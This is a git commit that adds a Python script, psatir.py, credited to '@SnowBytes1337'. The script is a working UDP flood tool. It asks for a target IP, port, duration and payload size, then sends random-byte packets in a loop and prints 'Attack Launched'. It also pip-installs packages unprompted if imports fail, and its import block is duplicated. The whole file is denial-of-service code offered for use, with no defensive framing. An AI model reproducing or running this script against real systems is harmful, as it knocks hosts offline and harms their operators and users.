ecc512e1c24057067176aa8822206a98ac1ea1d0
Dimashhgffy <ssyat612@gmail.com>
2022-10-15 12:13:42 +0000

    KONTOL

---
+++ psatir.py
@@ -0,0 +1,73 @@
+﻿import os, sys, codecs
+
+try:
+    import socks, requests, wget, cfscrape, urllib3
+except:
+    if sys.platform.startswith("linux"):
+        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
+    elif sys.platform.startswith("freebsd"):
+        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
+    else:
+        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")
+
+import os, sys, codecs
+
+try:
+    import socks, requests, wget, cfscrape, urllib3
+except:
+    if sys.platform.startswith("linux"):
+        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
+    elif sys.platform.startswith("freebsd"):
+        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
+    else:
+        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")
+
+from time import time as tt
+import threading
+import socket
+import random
+
+print("Tools By @SnowBytes1337")
+ip = str(input("[ IP ] ====> : "))
+port = int(input("[PORT] ====> : "))
+time = int(input("[TIME] ====> : "))
+size = int(input("[THREAD] ====> : "))
+
+brand = "attack"
+
+os.system("clear")
+def attack(ip, port, time, size):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(65535, port))
+    print(brand)
+    print("Attack Launched")
+    fmt = 'Attacked ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    size = os.urandom(min(666, size))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or random.randint(1, 65535)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(size, (ip, port))
+
+    print('Attack Finished')
+
+if __name__ == '__main__':
+    try:
+        attack(ip, port, time, size)
+    except KeyboardInterrupt:
+        print('Attack stopped.')
